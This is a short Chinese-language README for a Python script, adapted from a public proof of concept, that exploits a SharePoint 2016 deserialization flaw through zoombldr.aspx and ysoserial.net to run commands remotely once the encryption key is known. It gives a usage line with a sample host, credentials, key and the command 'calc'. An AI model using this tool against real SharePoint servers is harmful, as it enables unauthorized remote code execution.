# sp16-zoombldr-deserializatoin

Modified from https://srcincite.io/pocs/cve-2020-16951.py.txt

一个简单的脚本，在测试 SharePoint 2016 反序列化漏洞时，获取了加解密密钥后调用 ysoserial.net 一键 rce

使用脚本需要同目录下有 `yss/ysoserial.exe` 

由于脚本用的 zoombldr.aspx 这个固定 path，别的版本比如13、19不确定是否也可

## usage

```bash
python3 sp16-zoombldr-deserializatoin.py <SPSite> <user:pass> <key> <cmd>

# eg.
python3 sp16-zoombldr-deserializatoin.py WIN-6669U6A35C6:10000 XiaoC@sp16:1 2873CDF0C96F4C3CAA489F470FB1DF6E74E963EB5E661AEB3CDDA45531999C6F calc
```